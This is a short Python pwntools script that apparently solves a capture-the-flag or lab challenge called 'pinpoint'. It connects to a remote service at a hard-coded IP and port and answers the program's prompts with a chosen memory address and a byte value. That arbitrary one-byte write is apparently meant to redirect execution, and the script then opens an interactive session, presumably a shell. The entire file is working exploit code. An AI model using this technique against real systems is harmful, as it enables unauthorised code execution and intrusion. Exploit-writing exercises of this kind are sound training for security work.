from pwn import *

IP = "141.85.224.99"
port = 31337

elf = ELF("./pinpoint")
# p = elf.process()
p = remote(IP, port)

# gdb.attach(p, gdbscript='''b scanf''')


p.recvuntil("address to write to: ")

address = 0x00601058 + 2
p.sendline(str(address))

p.recvuntil("value to write: ")

value = 0x58

p.sendline(str(value))


p.interactive()

